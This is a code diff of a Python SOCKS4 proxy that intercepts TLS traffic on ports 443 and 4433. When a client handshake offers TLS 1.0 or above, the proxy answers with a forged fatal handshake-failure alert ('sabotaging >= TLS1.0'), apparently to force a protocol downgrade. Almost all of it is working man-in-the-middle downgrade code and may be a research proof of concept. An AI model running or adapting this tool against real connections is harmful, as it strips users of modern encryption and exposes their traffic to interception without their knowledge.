@@ -2,40 +2,25 @@ import socketserver
 import socket
 import select
 import os
+import io
+import sys
 
 from tls import Message, build_fatal_alert, AlertDescription
 from tls import ContentType, HandshakeType, CipherSuite, ProtocolVersion
 
 MAX = 8192
+ENABLE_DOWNGRADE = True
 
-# transform functions take the from-local and from-remote data,
-# and return the to-local and to-remote data, plus the next transform
-
-def tls_mitm_transform(from_front, from_back):
-    if from_front:
-        m = Message.decode(from_front)
-        if m.type == ContentType.Handshake and m.body.type == HandshakeType.ClientHello:
-            print('message version:', ProtocolVersion.tostring(m.version))
-            print('clienthello max version:', ProtocolVersion.tostring(m.body.body.version))
-            print('ciphersuites:', [CipherSuite.lookup(cs) for cs in m.body.body.ciphersuites])
-            if m.version >= ProtocolVersion.TLSv1_0:
-                print('rejecting handshake to encourage downgrade')
-                return bytes(build_fatal_alert(AlertDescription.HandshakeFailure)), None, tls_mitm_transform
-            else:
-                print('downgrade succeeded, allowing handshake')
-                return from_back, from_front, null_transform
-
-    return from_back, from_front, tls_mitm_transform
-    
-def null_transform(from_front, from_back):
-    return from_back, from_front, null_transform
-
-def echo_transform(from_front, from_back):
-    return from_front, from_back, echo_transform
+def dump(why, bb):
+    #print(why, len(bb), '::', ''.join(['{0:02x}'.format(x) for x in bb]))
+    pass
 
 class socks_handler(socketserver.BaseRequestHandler):
     def handle_socks_setup(self):
         req = self.request.recv(9)
+        if len(req) != 9:
+            raise IOError('short socks4 request')
+        
         ver, cmd, port, ip, nul = req[0], req[1], req[2:4], req[4:8], req[8]
         assert ver == 0x04
         assert cmd == 0x01
@@ -44,31 +29,60 @@ class socks_handler(socketserver.BaseRequestHandler):
         self.backend_ip = '{0}.{1}.{2}.{3}'.format(*ip)
         self.backend_port = port[0] << 8 | port[1]
         
-        print('connect to {0}:{1}'.format(self.backend_ip, self.backend_port))
         self.backend = socket.create_connection((self.backend_ip, self.backend_port))
-        print('connected')
-
         self.request.sendall(bytes([0, 0x5a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]))
 
-    def handle(self):
-        print('socks client connected from', self.client_address)
+    def tls_incoming(self, m):
+        #print('incoming from remote', m)
         
-        self.handle_socks_setup()
+        if m.type == ContentType.ChangeCipherSpec:
+            self.seen_changecipherspec = True
 
-        if self.backend_port in (443, 4433):
-            transform = tls_mitm_transform
+        if m.type == ContentType.Handshake and not m.opaque and m.body.type == HandshakeType.ServerHello:
+            print('server selected', CipherSuite.tostring(m.body.body.ciphersuite))
+
+        self.request.sendall(bytes(m))
+
+    def tls_outgoing(self, m):
+        #print('outgoing from local', m)
+        
+        if m.type == ContentType.ChangeCipherSpec:
+            self.seen_changecipherspec = True
+            
+        if m.type == ContentType.Handshake and m.version >= ProtocolVersion.TLSv1_0 and ENABLE_DOWNGRADE:
+            print('sabotaging >= TLS1.0')
+            self.request.sendall(bytes(build_fatal_alert(AlertDescription.HandshakeFailure)))
+            return
+        
+        self.backend.sendall(bytes(m))
+
+    def check_buf(self, buf, handler):
+        while Message.prefix_has_full_frame(bytes(buf)):
+            m = Message.decode(bytes(buf), opaque = self.seen_changecipherspec)
+            lm = len(bytes(m))
+            assert bytes(m) == bytes(buf[0:lm])
+            del buf[0:lm]
+            handler(m)
+
+    def echo(self, buf, out):
+        out.sendall(bytes(buf))
+        buf[:] = []
+
+    def check_bufs(self):
+        if self.tls_enabled:
+            self.check_buf(self.oubuf, self.tls_outgoing)
+            self.check_buf(self.inbuf, self.tls_incoming)
         else:
-            transform = null_transform
+            self.echo(self.oubuf, self.backend)
+            self.echo(self.inbuf, self.request)
 
-        def dispatch(from_front, from_back, transform):
-            to_front, to_back, transform = transform(from_front, from_back)
-            if to_front:
-                print('<-', len(to_front))
-                self.request.sendall(to_front)
-            if to_back:
-                print('->', len(to_back))
-                self.backend.sendall(to_back)
-            return transform
+    def handle(self):        
+        self.handle_socks_setup()
+        self.inbuf = []
+        self.oubuf = []
+        self.seen_changecipherspec = False
+
+        self.tls_enabled = self.backend_port in (443, 4433)
 
         try:
             while True:
@@ -81,27 +95,27 @@ class socks_handler(socketserver.BaseRequestHandler):
                     raise IOError('socket error: {0}'.format(x))
 
                 if self.backend in r:
-                    packet = self.backend.recv(MAX)
+                    packet = bytes(self.backend.recv(MAX))
                     if len(packet) == 0:
-                        print('eof from back')
                         break
-
-                    transform = dispatch(None, packet, transform)
+                    dump('incoming', packet)
+                    self.inbuf.extend(packet)
+                    self.check_bufs()
                 
                 if self.request in r:
-                    packet = self.request.recv(MAX)
+                    packet = bytes(self.request.recv(MAX))
                     if len(packet) == 0:
-                        print('eof from front')
                         break
-
-                    transform = dispatch(packet, None, transform)
+                    dump('outgoing', packet)
+                    self.oubuf.extend(packet)
+                    self.check_bufs()
+                
         except KeyboardInterrupt:
             os._exit(1)
         finally:
-            print('closing')
             self.backend.close()
             self.request.close()
-        
+
 class RebindTCP(socketserver.ThreadingMixIn, socketserver.TCPServer):
     def __init__(self, *args, **kwargs):
         self.allow_reuse_address = True
@@ -111,4 +125,5 @@ if __name__ == '__main__':
     HOST, PORT = 'localhost', 3355
 
     server = RebindTCP((HOST, PORT), socks_handler)
+    print('listening on', HOST, PORT)
     server.serve_forever()
